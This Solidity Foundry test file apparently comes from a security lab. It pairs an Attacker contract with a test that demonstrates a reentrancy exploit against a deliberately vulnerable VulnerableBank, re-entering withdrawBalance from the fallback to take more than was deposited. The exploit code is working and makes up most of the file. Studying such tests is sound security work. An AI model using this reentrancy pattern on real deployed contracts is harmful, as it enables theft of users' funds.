// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/VulnerableBank.sol";

contract Attacker {
    VulnerableBank public vulnerableBank;
    bool public attacked;

    constructor(address _vulnerableBank) {
        vulnerableBank = VulnerableBank(_vulnerableBank);
    }

    function attack() public payable {
        // Deposit some Ether to the bank
        vulnerableBank.addToBalance{value: msg.value}();
        // Start the reentrancy attack
        vulnerableBank.withdrawBalance();
    }

    // Fallback function to re-enter withdrawBalance()
    receive() external payable {
        if (address(vulnerableBank).balance >= 1 ether && !attacked) {
            attacked = true;
            vulnerableBank.withdrawBalance();
        }
    }
}

contract VulnerableBankTest is Test {
    VulnerableBank public vulnerableBank;
    Attacker public attacker;
    address public user = address(0x1);

    function setUp() public {
        vulnerableBank = new VulnerableBank();

        // Fund the bank with 10 Ether from a user
        vm.deal(user, 10 ether);
        vm.prank(user);
        vulnerableBank.addToBalance{value: 10 ether}();
    }

    function testReentrancyAttack() public {
        // Deploy the attacker contract
        attacker = new Attacker(address(vulnerableBank));

        // Fund the attacker with 1 Ether
        vm.deal(address(attacker), 1 ether);

        // Start the attack
        vm.prank(address(attacker));
        attacker.attack{value: 1 ether}();

        // Check the results
        uint256 attackerBalance = address(attacker).balance;
        uint256 bankBalance = address(vulnerableBank).balance;

        console.log("Attacker Balance:", attackerBalance);
        console.log("Bank Balance:", bankBalance);

        // Assert that the attacker drained the bank
        assertTrue(attackerBalance > 1 ether);
        assertTrue(bankBalance < 10 ether);
    }
}